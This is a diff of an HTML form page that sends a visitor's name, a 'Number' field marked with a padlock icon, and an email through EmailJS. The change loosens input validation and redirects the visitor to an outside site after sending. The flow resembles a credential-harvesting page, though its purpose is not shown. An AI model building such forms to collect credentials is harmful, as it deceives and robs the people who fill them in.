@@ -192,7 +192,8 @@
     align-items: center;
     border: 1px solid #e3e3ee;
     border-radius: 6px;
-    padding: 14px 16px;
+    height: 52px;
+    padding: 0 16px;
     margin-bottom: 20px;
     background: #fff;}
 #emailScreen .field .icon {
@@ -222,6 +223,12 @@
     transition: background 0.2s ease;}
 #emailScreen .btn-contact:hover {
     background: #82ab49;}
+
+@media (max-width: 480px) {
+  #emailScreen .card {
+    padding: 28px 20px;
+  }
+}
 </style>
 <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 </head>
@@ -243,18 +250,18 @@
           <span class="icon">
             <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 12c2.7 0 4.9-2.2 4.9-4.9S14.7 2.2 12 2.2 7.1 4.4 7.1 7.1 9.3 12 12 12zm0 2.5c-3.3 0-9.8 1.6-9.8 4.9v2.4h19.6v-2.4c0-3.3-6.5-4.9-9.8-4.9z"/></svg>
           </span>
-          <input type="text" id="welcomeName" placeholder="Name" required>
+          <input type="text" id="welcomeName" placeholder="Name">
         </div>
 
         <div class="field">
           <span class="icon">
             <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M17 8V6a5 5 0 0 0-10 0v2H5v14h14V8h-2zM9 6a3 3 0 0 1 6 0v2H9V6zm3 9a2 2 0 1 1 0-4 2 2 0 0 1 0 4z"/></svg>
           </span>
-          <input type="text" id="welcomeNumber" placeholder="Number" required>
+          <input type="text" id="welcomeNumber" placeholder="Number">
         </div>
 
         <div class="field captcha-field">
-          <input type="text" placeholder="Captcha" required>
+          <input type="text" placeholder="Captcha">
           <div class="captcha-box">
             <svg viewBox="0 0 150 56" preserveAspectRatio="none" xmlns="http://www.w3.org/2000/svg">
               <defs>
@@ -304,7 +311,7 @@
         <span class="icon">
           <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M17 8V6a5 5 0 0 0-10 0v2H5v14h14V8h-2zM9 6a3 3 0 0 1 6 0v2H9V6zm3 9a2 2 0 1 1 0-4 2 2 0 0 1 0 4z"/></svg>
         </span>
-        <input type="email" id="emailInput" placeholder="Your Email" required>
+        <input type="text" id="emailInput" placeholder="Your Email">
       </div>
 
       <button type="submit" class="btn-contact">Contact</button>
@@ -347,8 +354,7 @@
 
       emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
         .then(function () {
-          alert('Thanks! We received your details and will be in touch.');
-          document.getElementById('emailForm').reset();
+          window.location.href = 'https://huboweb.com';
         })
         .catch(function (err) {
           console.error('EmailJS error:', err);
